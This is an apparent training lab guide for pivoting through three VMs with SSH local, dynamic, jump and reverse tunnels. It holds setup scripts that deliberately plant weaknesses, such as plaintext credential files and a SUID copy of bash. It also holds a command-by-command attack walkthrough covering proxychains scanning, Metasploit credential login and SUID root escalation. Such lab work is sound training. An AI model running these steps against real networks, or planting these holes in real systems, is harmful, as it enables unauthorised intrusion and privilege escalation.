# Lab 4: SSH Tunnel Mastery

## Objective

Practice every type of SSH tunnel — local forwards, dynamic forwards (SOCKS), reverse tunnels, SSH jump chaining, and multi-port forwarding. Use Metasploit and nmap through tunnels to exploit an internal target three hops away.

## Skills Practiced

- SSH local port forwarding (single and multiple ports)
- SSH dynamic port forwarding (SOCKS proxy with proxychains)
- SSH jump chaining with `-J` flag
- Reverse SSH tunnels
- Reverse SSH tunnels blocked by egress filtering
- nmap and nc through tunnels
- Metasploit auxiliary scanners through tunnels
- Metasploit session management through tunnels
- Multi-hop pivoting
- SUID binary privilege escalation

## Prerequisites

- CentOS and Ubuntu need second NICs on the same Host-only VMnet for 172.16.0.0/24
- Kali: `sudo apt install chisel -y` (optional for this lab but good to have)

Verify 172.16.0.0/24 connectivity:

```bash
# On CentOS
sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null
sudo ip link set ens224 up

# On Ubuntu
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null
sudo ip link set ens38 up

# Test
# From CentOS: ping -c 2 172.16.0.2
# From Ubuntu: ping -c 2 172.16.0.1
```

> Replace `ens224` and `ens38` with your actual interface names.

## Network Diagram

```
ATTACKER                DMZ                      INTERNAL

Kali                    Debian (pivot box)        CentOS (app server)
192.168.244.129         192.168.244.132           192.168.244.131
                                                   172.16.0.1
                                                       │
                                                  Ubuntu (target)
                                                  172.16.0.2
```

**Goal:** Use SSH tunnels to reach Ubuntu (three hops from Kali) and capture the flag.

---

## Setup

### Debian (pivot box — 192.168.244.132)

```bash
sudo apt update
sudo apt install openssh-server apache2 -y
sudo systemctl enable --now ssh
sudo systemctl enable --now apache2

# Create pivot user (you "already have" these creds from a previous engagement)
sudo useradd -m -s /bin/bash pivot
echo "pivot:Piv0t@cc3ss!" | sudo chpasswd

# Breadcrumbs
sudo mkdir -p /home/pivot/recon
echo "=== Network Map ===" | sudo tee /home/pivot/recon/targets.txt
echo "CentOS app server: 192.168.244.131" | sudo tee -a /home/pivot/recon/targets.txt
echo "SSH: appadmin / AppS3rv3r!" | sudo tee -a /home/pivot/recon/targets.txt
echo "CentOS has a second interface on 172.16.0.0/24" | sudo tee -a /home/pivot/recon/targets.txt
echo "Ubuntu dev box: 172.16.0.2 (only reachable from CentOS)" | sudo tee -a /home/pivot/recon/targets.txt
echo "SSH: developer / D3v3l0p3r!" | sudo tee -a /home/pivot/recon/targets.txt
sudo chown -R pivot:pivot /home/pivot/recon

# Web page
echo "<h1>DMZ Web Server</h1>" | sudo tee /var/www/html/index.html

# Allow SSH forwarding
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Open firewall
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

### CentOS (app server — 192.168.244.131 + 172.16.0.1)

```bash
sudo systemctl stop firewalld
sudo systemctl disable firewalld
sudo dnf install iptables-services python3 -y

sudo systemctl enable --now sshd

# Create appadmin user
sudo useradd -m -s /bin/bash appadmin
echo "appadmin:AppS3rv3r!" | sudo chpasswd
sudo usermod -aG wheel appadmin

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Web app on port 8080
sudo mkdir -p /opt/webapp/config
echo "<h1>Internal Application Server</h1>" | sudo tee /opt/webapp/index.html
echo "<p>Config backup: /opt/webapp/config/</p>" | sudo tee -a /opt/webapp/index.html

echo "DB_HOST=172.16.0.2" | sudo tee /opt/webapp/config/database.conf
echo "DB_PORT=3306" | sudo tee -a /opt/webapp/config/database.conf
echo "DB_USER=root" | sudo tee -a /opt/webapp/config/database.conf
echo "DB_PASS=r00tD@t@b@se!" | sudo tee -a /opt/webapp/config/database.conf

cat << 'EOF' | sudo tee /opt/webapp/app.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
os.chdir('/opt/webapp')
HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler).serve_forever()
EOF

nohup python3 /opt/webapp/app.py &>/dev/null &

# Breadcrumbs
sudo mkdir -p /home/appadmin/tools
echo "#!/bin/bash" | sudo tee /home/appadmin/tools/check_internal.sh
echo "ping -c 1 172.16.0.2" | sudo tee -a /home/appadmin/tools/check_internal.sh
echo "ssh developer@172.16.0.2 'uptime'" | sudo tee -a /home/appadmin/tools/check_internal.sh
sudo chown -R appadmin:appadmin /home/appadmin/tools

# Allow SSH forwarding
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# === IPTABLES ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8080 -s 192.168.244.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8080 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -j LOG --log-prefix "APP-DROPPED: " --log-level 4
sudo iptables -P INPUT DROP

# Block reverse SSH to Kali
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j LOG --log-prefix "APP-BLOCKED-SSH: " --log-level 4
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j DROP
sudo iptables -P OUTPUT ACCEPT

# FORWARD between subnets
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -P FORWARD DROP

# NAT (replace ens224 with your interface)
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE

sudo service iptables save
```

### Ubuntu (target — 172.16.0.2)

```bash
sudo apt update
sudo apt install openssh-server apache2 php libapache2-mod-php -y
sudo systemctl enable --now ssh
sudo systemctl enable --now apache2

# Create developer user
sudo useradd -m -s /bin/bash developer
echo "developer:D3v3l0p3r!" | sudo chpasswd

# Allow SSH forwarding (for reverse tunnels FROM Ubuntu)
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Web server
echo "<h1>Internal Dev Server</h1><p>Project Status Dashboard</p>" | sudo tee /var/www/html/index.html

sudo mkdir -p /var/www/html/projects
echo "<h1>Project Files</h1><p>API keys in /home/developer/.api_keys</p>" | sudo tee /var/www/html/projects/index.html

# Sensitive files
sudo mkdir -p /home/developer/.api_keys
echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" | sudo tee /home/developer/.api_keys/aws.txt
echo "AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" | sudo tee -a /home/developer/.api_keys/aws.txt
sudo chown -R developer:developer /home/developer

# API service on port 3000
cat << 'EOF' | sudo tee /opt/internal_app.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/secret':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"secret":"FLAG_PARTIAL{api_endpoint_found}","admin_hash":"5f4dcc3b5aa765d61d8327deb882cf99"}')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"ok","endpoints":["/api/secret","/api/health"]}')
HTTPServer(('0.0.0.0', 3000), Handler).serve_forever()
EOF

nohup python3 /opt/internal_app.py &>/dev/null &

# Create the flag
echo "FLAG{ssh_tunnel_master_2026}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# SUID bash for privesc
sudo cp /usr/bin/bash /usr/local/bin/bash_debug
sudo chmod u+s /usr/local/bin/bash_debug

# === IPTABLES — only allow from internal network ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 3000 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -s 192.168.244.0/24 -j LOG --log-prefix "DEV-BLOCKED-DMZ: " --log-level 4
sudo iptables -A INPUT -s 192.168.244.0/24 -j DROP
sudo iptables -A INPUT -j LOG --log-prefix "DEV-DROPPED: " --log-level 4
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

---

## Attack Walkthrough

### Phase 1: Recon

```bash
nmap -sn 192.168.244.0/24
nmap -sV -sC 192.168.244.132 -oN debian_scan.txt
nmap -sV -sC 192.168.244.131 -oN centos_scan.txt

nc -vn 192.168.244.132 22
nc -vn 192.168.244.131 22
```

### Phase 2: Access Debian and Enumerate

```bash
ssh pivot@192.168.244.132
# Password: Piv0t@cc3ss!

cat /home/pivot/recon/targets.txt
# Found: CentOS creds, Ubuntu creds, internal network info
```

### Phase 3: SSH Local Port Forward — Reach CentOS Web App

CentOS has a web app on port 8080 that Kali can't reach directly.

```bash
# From Kali
ssh -L 8080:192.168.244.131:8080 pivot@192.168.244.132
# Password: Piv0t@cc3ss!
```

**Traffic flow:**
```
Kali localhost:8080 → SSH tunnel → Debian → CentOS:8080
```

New Kali terminal:

```bash
curl http://localhost:8080
curl http://localhost:8080/config/database.conf
# Found: database credentials pointing to 172.16.0.2
```

### Phase 4: SSH Dynamic Forward (SOCKS) — Scan Internal Network

```bash
# From Kali — SOCKS proxy through Debian jumping to CentOS
ssh -D 9050 -J pivot@192.168.244.132 appadmin@192.168.244.131
# Debian password: Piv0t@cc3ss!
# CentOS password: AppS3rv3r!
```

**Traffic flow:**
```
Kali SOCKS:9050 → SSH jump through Debian → CentOS → internal network
```

Configure proxychains:

```bash
sudo nano /etc/proxychains4.conf
# Change last line to: socks5 127.0.0.1 9050
```

Scan:

```bash
proxychains nmap -sT -Pn -sV 172.16.0.2 -p 22,80,3000
proxychains nc -vn 172.16.0.2 22
proxychains nc -vn 172.16.0.2 80
proxychains nc -vn 172.16.0.2 3000
proxychains curl http://172.16.0.2
proxychains curl http://172.16.0.2:3000/api/secret
```

### Phase 5: SSH Multi-Port Local Forward — Bring Services to Kali

```bash
# From Kali — forward all three Ubuntu services
ssh -L 2222:172.16.0.2:22 -L 8888:172.16.0.2:80 -L 3000:172.16.0.2:3000 \
    -J pivot@192.168.244.132 appadmin@192.168.244.131
```

**Result:**
```
Kali localhost:2222  →  tunnel  →  Ubuntu:22  (SSH)
Kali localhost:8888  →  tunnel  →  Ubuntu:80  (HTTP)
Kali localhost:3000  →  tunnel  →  Ubuntu:3000 (API)
```

Now use tools against localhost:

```bash
ssh developer@localhost -p 2222
curl http://localhost:8888/projects/
curl http://localhost:3000/api/secret
nmap -sV -sC localhost -p 2222,8888,3000
```

### Phase 6: Metasploit Through Tunnels

```bash
sudo systemctl start postgresql
msfconsole
```

```bash
# SSH version scan through forwarded port
msf6> use auxiliary/scanner/ssh/ssh_version
msf6> set RHOSTS 127.0.0.1
msf6> set RPORT 2222
msf6> run

# HTTP version scan
msf6> use auxiliary/scanner/http/http_version
msf6> set RHOSTS 127.0.0.1
msf6> set RPORT 8888
msf6> run

# SSH login with found credentials
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set RHOSTS 127.0.0.1
msf6> set RPORT 2222
msf6> set USERNAME developer
msf6> set PASSWORD D3v3l0p3r!
msf6> run

# Check stored results
msf6> hosts
msf6> services
msf6> creds

# Interact with the session
msf6> sessions
msf6> sessions -i 1
```

### Phase 7: Reverse SSH Tunnel Attempt — Blocked

```bash
# From CentOS
ssh -R 9050 kali_user@192.168.244.129
# FAILS

sudo grep "APP-BLOCKED" /var/log/messages
# Confirms egress filter blocks outbound SSH to Kali
```

### Phase 8: Reverse SSH Tunnel FROM Ubuntu (works)

Ubuntu has no egress restrictions. From CentOS:

```bash
ssh developer@172.16.0.2
# Password: D3v3l0p3r!
```

From Ubuntu:

```bash
# Reverse forward Ubuntu's API port to CentOS
ssh -R 4444:localhost:3000 appadmin@172.16.0.1
# Password: AppS3rv3r!
```

Now from CentOS:

```bash
curl http://localhost:4444
curl http://localhost:4444/api/secret
# Accessing Ubuntu's internal API through the reverse tunnel
```

### Phase 9: Privilege Escalation

```bash
# SSH to Ubuntu through the local forward
ssh developer@localhost -p 2222
# Password: D3v3l0p3r!

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/bash_debug

# Exploit
/usr/local/bin/bash_debug -p

whoami
# root

cat /root/flag.txt
# FLAG{ssh_tunnel_master_2026}
```

---

## All Tunnel Types Practiced

| Type | Command | What It Does |
|---|---|---|
| Local forward (single) | `ssh -L 8080:target:8080 user@pivot` | Reach one service through pivot |
| Local forward (multi) | `ssh -L 2222:t:22 -L 8888:t:80 user@pivot` | Reach multiple services |
| Dynamic forward | `ssh -D 9050 user@pivot` | SOCKS proxy for broad scanning |
| Jump + dynamic | `ssh -D 9050 -J user@hop1 user@hop2` | SOCKS through multiple hops |
| Reverse forward | `ssh -R 4444:localhost:3000 user@remote` | Expose local service to remote |
| Background tunnel | `ssh -fN -D 9050 user@pivot` | Run tunnel without interactive shell |
| proxychains | `proxychains nmap -sT -Pn target` | Route any tool through SOCKS |

## Attack Chain Summary

```
Phase 1: Recon          → nmap + nc find services
Phase 2: Enumerate      → SSH to Debian, read target notes
Phase 3: Local Forward  → Reach CentOS web app, find DB creds
Phase 4: SOCKS Proxy    → Scan internal 172.16.0.0/24 through tunnel
Phase 5: Multi-Forward  → Bring three Ubuntu services to localhost
Phase 6: Metasploit     → Scan and exploit through forwarded ports
Phase 7: Reverse Tunnel → Blocked by egress iptables
Phase 8: Reverse from Ubuntu → Works (no egress filter on Ubuntu)
Phase 9: Priv Esc       → SUID bash_debug → root → flag
```

## When to Use Each Tunnel Type

| Situation | Tunnel Type |
|---|---|
| Need one specific internal service | Local forward (`-L`) |
| Need to scan/enumerate broadly | Dynamic forward (`-D`) + proxychains |
| Target can't receive inbound connections | Reverse forward (`-R`) |
| Multiple hops to reach the target | Jump chain (`-J`) |
| Need multiple services at once | Multi-port local forward (`-L -L -L`) |
| Need tunnel running in background | Add `-fN` to any of the above |

## Cleanup

```bash
# Debian
sudo userdel -r pivot 2>/dev/null
sudo iptables -F && sudo iptables -P INPUT ACCEPT

# CentOS
sudo userdel -r appadmin 2>/dev/null
sudo kill $(pgrep -f app.py) 2>/dev/null
sudo rm -rf /opt/webapp
sudo iptables -F && sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT

# Ubuntu
sudo userdel -r developer 2>/dev/null
sudo kill $(pgrep -f internal_app.py) 2>/dev/null
sudo rm -f /usr/local/bin/bash_debug /root/flag.txt /opt/internal_app.py
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
